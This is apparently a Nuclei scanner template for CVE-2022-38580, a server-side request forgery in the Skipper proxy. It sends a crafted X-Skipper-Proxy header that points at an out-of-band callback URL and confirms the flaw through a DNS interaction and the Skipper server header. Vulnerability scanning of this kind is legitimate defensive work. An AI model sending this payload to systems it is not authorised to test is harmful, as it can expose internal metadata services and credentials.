id: CVE-2022-38580

info:
  name: Skipper <= v0.13.236 SSRF
  author: dwisiswant0
  severity: critical
  description: |
    Skipper prior to version v0.13.236 is vulnerable to server-side
    request forgery (SSRF). An attacker can exploit a vulnerable
    version of proxy to access the internal metadata server or other
    unauthenticated URLs by adding an specific header (X-Skipper-Proxy)
    to the http request.
  reference:
    - https://github.com/advisories/GHSA-f2rj-m42r-6jm2
  tags: cve,cve2022,skipper,ssrf

requests:
  - method: GET
    headers:
      X-Skipper-Proxy: "http://{{interactsh-url}}"
    path:
      - "{{BaseURL}}"
      - "{{BaseURL}}:9090"

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol # Confirms the DNS Interaction
        words:
          - "dns"

      - type: dsl
        dsl:
          - "contains(to_lower(header), 'server: skipper')"